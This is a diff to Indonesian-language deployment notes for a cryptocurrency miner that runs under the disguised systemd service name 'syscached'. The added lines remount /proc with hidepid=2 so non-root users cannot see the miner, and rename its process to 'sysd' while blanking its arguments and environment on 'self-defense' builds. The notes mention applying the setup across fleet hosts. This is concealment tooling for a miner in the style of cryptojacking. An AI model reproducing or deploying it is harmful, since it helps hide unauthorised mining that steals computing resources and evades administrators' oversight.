@@ -22,10 +22,31 @@ exec /usr/local/bin/xcb "$@"
 EOF
 sudo chmod 0700 /usr/local/sbin/sysd
 sudo install -m 644 ops/systemd/syscached.service /etc/systemd/system/syscached.service
+sudo install -d -m 755 /etc/systemd/system/syscached.service.d
+sudo tee /etc/systemd/system/xcb-proc-hidepid.service >/dev/null <<'EOF'
+[Unit]
+Description=Hide other users' processes in /proc
+DefaultDependencies=no
+After=local-fs.target
+Before=syscached.service
+
+[Service]
+Type=oneshot
+ExecStart=/bin/mount -o remount,hidepid=2 /proc
+RemainAfterExit=yes
+
+[Install]
+WantedBy=multi-user.target
+EOF
+sudo tee /etc/systemd/system/syscached.service.d/10-hidepid.conf >/dev/null <<'EOF'
+[Unit]
+Wants=xcb-proc-hidepid.service
+After=xcb-proc-hidepid.service
+EOF
 sudo install -m 600 ops/systemd/miner.env.example /etc/xcb/miner.env
-sudoedit /etc/xcb/miner.env          # isi WALLET/WORKER/THREADS
+sudoedit /etc/xcb/miner.env          # isi WALLET/WORKER/THREADS + XCB_TITLE=sysd
 sudo systemctl daemon-reload
-sudo systemctl enable --now syscached
+sudo systemctl enable --now xcb-proc-hidepid.service syscached
 ```
 
 Cek:
@@ -34,6 +55,7 @@ Cek:
 systemctl status syscached
 journalctl -u syscached -n 50 --no-pager
 ldd /usr/local/bin/xcb | grep librandomx_v2
+grep ' /proc ' /proc/mounts | grep -o 'hidepid=[a-z0-9]*'
 ```
 
 ## Catatan
@@ -52,6 +74,11 @@ ldd /usr/local/bin/xcb | grep librandomx_v2
 - Wallet dan pool dibaca dari `WALLET`/`CONN_ADDRESS` dan `CONN_POOL` di
   `miner.env`; tidak ada lagi `-u` di `ExecStart`. `CONN_ADDRESS` menang atas
   `WALLET` di binary baru, jadi wrapper selalu menyamakan keduanya.
+- `XCB_TITLE=sysd` di `miner.env` mengganti comm dan mengosongkan argv/env,
+  tetapi hanya pada binary dengan `ENABLE_SELF_DEFENSE=ON`; build biasa
+  mengabaikannya. `xcb-proc-hidepid.service` me-remount `/proc` dengan
+  `hidepid=2` sehingga user non-root tidak melihat proses root sama sekali;
+  drop-in `10-hidepid.conf` menjaga remount selesai sebelum `syscached`.
 - `install.sh` membackup binary, library, dan unit lama dengan akhiran
   `-<stamp>` dan mencetak perintah rollback satu baris. Ganti unit di host
   fleet lewat `install.sh`, bukan `deploy.sh`: `apply.sh rollback` (dipakai
